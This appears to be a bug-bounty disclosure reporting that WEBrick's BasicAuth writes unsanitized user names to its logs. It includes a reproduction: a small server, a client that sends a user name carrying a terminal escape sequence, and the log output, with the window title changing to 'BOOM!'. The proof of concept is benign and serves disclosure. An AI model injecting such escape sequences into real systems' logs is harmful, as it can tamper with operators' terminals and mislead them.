## Vulnerability Information
WEBrick BasicAuth outputs any non-existing user name to logs without sanitizing.  By exploting this, an attacker can inject malicious escape sequences to its logs.  This issue is exactly the same as [the old already-fixed vulnerability](https://www.ruby-lang.org/en/news/2010/01/10/webrick-escape-sequence-injection/).

How to reproduce:

1) Run this WEBrick server program in a terminal.

~~~~
require "webrick"
require "webrick/httpauth"

srv = WEBrick::HTTPServer.new({ Port: 34567 })
db = WEBrick::HTTPAuth::Htpasswd.new("dot.htpasswd")
authenticator = WEBrick::HTTPAuth::BasicAuth.new(UserDB: db, Realm: "realm")
srv.mount_proc("/") do |req, res|
  authenticator.authenticate(req, res)
  res.body = "foobar"
end
srv.start
~~~~

2) Run this attack access program in another terminal.

~~~~
require "open-uri"

open("http://localhost:34567/login",
  http_basic_authentication: [
      "ESCAPE SEQUENCE HERE->\e]2;BOOM!\a<-SEE WINDOW TITLE",
      "passwd"
]).read
~~~~

3) See the first terminal that runs the server.  You will see a line like this, and its window title changed "BOOM!".

~~~~
[2017-04-24 19:23:46] ERROR Basic realm: ESCAPE SEQUENCE HERE-><-SEE WINDOW TITLE: the user is not allowed.
~~~~

Note: I'm a member of the ruby-core team, but I'm not involved with development of WEBrick.  I did not create the bug, of course.  I will happily accept any bounty if any :-)
